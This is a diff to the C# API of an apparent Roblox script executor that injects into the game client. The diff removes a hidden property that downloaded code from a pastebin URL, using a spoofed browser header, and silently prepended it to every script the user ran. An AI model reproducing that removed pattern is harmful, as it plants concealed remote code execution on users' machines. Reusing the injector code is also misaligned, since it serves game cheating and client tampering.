@@ -2,7 +2,6 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
-using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -39,14 +38,11 @@ namespace SaturnApi
                 Initialize(false);
                 _initialized = true;
             }
+
             var proc = Process.GetProcessesByName("RobloxPlayerBeta").FirstOrDefault();
             if (proc != null)
             {
-                try
-                {
-                    proc.WaitForInputIdle(5000);
-                }
-                catch { }
+                try { proc.WaitForInputIdle(5000); } catch { }
             }
 
             Thread.Sleep(2000);
@@ -55,7 +51,6 @@ namespace SaturnApi
             WaitForClients();
             _isInjected = GetClientsList().Count > 0;
         }
-
 
         public static bool IsInjected() => _isInjected;
 
@@ -100,8 +95,7 @@ namespace SaturnApi
 
             int[] ids = clients.Select(c => c.Id).ToArray();
 
-            string fullScript = ExecutionCode + "\n" + scriptSource;
-            byte[] scriptBytes = Encoding.UTF8.GetBytes(fullScript + "\0");
+            byte[] scriptBytes = Encoding.UTF8.GetBytes(scriptSource + "\0");
             Execute(scriptBytes, ids, ids.Length);
         }
 
@@ -144,7 +138,7 @@ namespace SaturnApi
                 if (GetClientsList().Count > 0)
                     break;
 
-                System.Threading.Thread.Sleep(pollInterval);
+                Thread.Sleep(pollInterval);
                 waited += pollInterval;
             }
         }
@@ -155,31 +149,6 @@ namespace SaturnApi
             public string Name;
             public string Version;
             public int State;
-        }
-
-        private static string _executionCodeCache;
-
-        private static string ExecutionCode
-        {
-            get
-            {
-                if (!string.IsNullOrEmpty(_executionCodeCache)) return _executionCodeCache;
-
-                try
-                {
-                    using (var client = new WebClient())
-                    {
-                        client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
-                        _executionCodeCache = client.DownloadString("https://pastebin.com/raw/G2uGmNUd");
-                    }
-                }
-                catch
-                {
-                    _executionCodeCache = "";
-                }
-
-                return _executionCodeCache;
-            }
         }
     }
 }
